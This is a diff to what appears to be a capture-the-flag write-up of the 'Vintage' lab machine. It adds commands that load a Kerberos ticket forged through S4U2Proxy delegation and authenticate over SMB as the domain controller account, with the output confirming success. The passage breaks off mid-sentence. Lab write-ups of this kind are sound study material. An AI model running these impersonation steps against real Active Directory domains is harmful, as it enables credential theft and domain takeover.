@@ -428,8 +428,16 @@ Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Requesting S4U2Proxy
 [*] Saving ticket in dc01$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
 ```
-I can now use this TGT to impersonate the administrator
+I can now use this TGT to authenticate as `DC01$`
 
 ```python
-
+export KRB5CCNAME=dc01\$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
 ```
+Now i can authenticate as `DC01$`
+
+```python
+nxc smb dc01.vintage.htb --use-kcache                               
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\dc01$ from ccache
+```
+It works now i can perform a DC
